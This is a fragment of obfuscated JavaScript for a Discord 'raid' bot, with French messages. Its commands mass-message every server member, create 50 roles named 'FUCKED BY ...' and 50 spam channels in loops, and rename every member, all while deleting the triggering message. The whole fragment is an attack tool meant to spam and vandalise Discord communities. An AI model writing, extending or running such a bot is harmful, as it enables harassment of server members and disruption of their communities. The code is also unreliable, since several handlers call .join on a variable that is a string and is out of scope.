        if (_0x49c6xd.content.startsWith(prefix + "mpall")) {

            _0x49c6xd.delete();

            if (_0x49c6xd.channel.type === "dm") {

                return _0x49c6xd.channel.send("Les commandes de raid ne sont pas utillisable en dm, Merci de vous rendre sur un serveur pour pouvoir les utilliser.")

            };

            if (_0x49c6xd.channel.type === "dm") {

                return

            };

            let _0x49c6xe = _0x49c6xd.content.split(" ").slice(1).join(" ");

            if (!_0x49c6xe) {

                return _0x49c6xd.channel.send(":skull_crossbones: ERROR 404 :skull_crossbones:")

            };

            _0x49c6xd.guild.members.forEach((_0x49c6x27) => {

                _0x49c6x27.send(_0x49c6xe).catch((_0x49c6x38) => {})

            });

            _0x49c6xd.channel.send("Mp all réussi :white_check_mark:")

        };

        if (_0x49c6xd.content.startsWith(prefix + "roleadd")) {

            _0x49c6xd.delete();

            if (_0x49c6xd.channel.type === "dm") {

                return _0x49c6xd.channel.send("Les commandes de raid ne sont pas utillisable en dm, Merci de vous rendre sur un serveur pour pouvoir les utilliser.")

            };

            role = 0;

            while (role < 50) {

                test = _0x49c6xe.join(" ");

                _0x49c6xd.guild.createRole({

                    name: "FUCKED BY ⱭƘⱭƬՏƲƘӀツ",

                    color: "#EA000D"

                });

                role++

            }

        };

        if (_0x49c6xd.content.startsWith(prefix + "chanadd")) {

            _0x49c6xd.delete();

            if (_0x49c6xd.channel.type === "dm") {

                return _0x49c6xd.channel.send("Les commandes de raid ne sont pas utillisable en dm, Merci de vous rendre sur un serveur pour pouvoir les utilliser.")

            };

            channeladd = 0;

            while (channeladd < 50) {

                _0x49c6xd.guild.createChannel(("" + (_0x49c6xe.join(" ")) + ""), "text");

                channeladd++

            }

        };

        if (_0x49c6xd.content.startsWith(prefix + "adminroleadd")) {

            _0x49c6xd.delete();

            if (_0x49c6xd.channel.type === "dm") {

                return _0x49c6xd.channel.send("Les commandes de raid ne sont pas utillisable en dm, Merci de vous rendre sur un serveur pour pouvoir les utilliser.")

            };

            _0x49c6xd.guild.createRole({

                name: "ⱭƘⱭƬՏƲƘӀツ",

            });

            _0x49c6xd.channel.send("Rôle ajouté :white_check_mark:")

        };

        if (_0x49c6xd.content.startsWith(prefix + "renameall")) {

            _0x49c6xd.delete();

            if (_0x49c6xd.channel.type === "dm") {

                return _0x49c6xd.channel.send("Les commandes de raid ne sont pas utillisable en dm, Merci de vous rendre sur un serveur pour pouvoir les utilliser.")

            };

            _0x49c6xd.guild.members.forEach((_0x49c6x20) => {

                _0x49c6x20.setNickname(("" + (_0x49c6xe.join(" ")) + ""))

            });

            _0x49c6xd.channel.send("Rename réussi :white_check_mark:")

        }

    } else {

        return

    }

});

bot.login(config.token)

